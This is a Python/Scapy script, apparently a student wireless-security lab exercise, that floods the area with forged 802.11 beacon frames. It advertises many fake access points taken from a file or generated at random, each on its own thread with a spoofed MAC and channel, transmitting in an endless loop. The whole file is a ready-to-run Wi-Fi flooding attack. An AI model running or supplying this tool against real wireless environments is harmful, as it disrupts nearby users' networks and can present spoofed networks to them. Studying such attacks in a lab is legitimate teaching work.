# Python 3.7.6
# 
# Auteurs: Adrien Barth, Lionel Burgbacher
# Date:    02.03.2020
# Source:  https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
#          https://gist.github.com/tintinweb/04c14d1497001e55e6c10ca28f198fbe
# 
# Description:
# Développer un script en Python/Scapy capable d'inonder la salle avec des SSID
# dont le nom correspond à une liste contenue dans un fichier texte fournit par un utilisateur.
# Si l'utilisateur ne possède pas une liste, il peut spécifier le nombre d'AP à générer.
# Dans ce cas, les SSID seront générés de manière aléatoire.
#

import argparse
import os.path
import string
import random
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap
from os import path
from threading import Thread

parser = argparse.ArgumentParser(description='SWI-Lab-01-SSID-Flood-Attack')
parser.add_argument("-f", "--filepath", help="File with the list of SSID to generate.")
parser.add_argument("-c", "--count", type=int, help="Number of SSID to generate if no file is provided.")
parser.add_argument("-i", "--iface", default="wlan0mon", help="Interface used for the attack")
args = parser.parse_args()

ssidList = []

'''
Arguments validation
'''
if args.filepath:
	if path.isfile(args.filepath):
		ssidList = [line.rstrip('\n') for line in open(args.filepath)]
	else:
		print("The provided filepath is invalid.")
else:
	if args.count and args.count > 0:
		for _ in range(args.count):
			ssidList.append(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)))
	else:
		print("Argument count must be greater than 0.")


'''
Using scapy, we flood a channel 802.11 Beacon for a given SSID.
Following 802.11 RFC, we sent a beacon every 100 ms.
'''
def ssidFlood(ssid, senderMAC, channel):
	dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=senderMAC, addr3=senderMAC)
	beacon = Dot11Beacon(cap="ESS+privacy")
	essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
	echann = Dot11Elt(ID="DSset", info=chr(channel))
	frame = RadioTap()/dot11/beacon/essid/echann
	sendp(frame, inter=0.1, iface=args.iface, verbose=False, loop=1)


'''
For each SSID we want to flood, we start a separate thread
'''
for ssid in ssidList:
	if ssid:
		senderMAC = str(RandMAC())
		channel = random.randrange(1,13)
		print("SSID: " + ssid + "; BSSID: " + senderMAC + "; Channel: " + str(channel))
		t = Thread(target=ssidFlood, args=(ssid, senderMAC, channel,))
		t.start()

print("SSID flooding started...")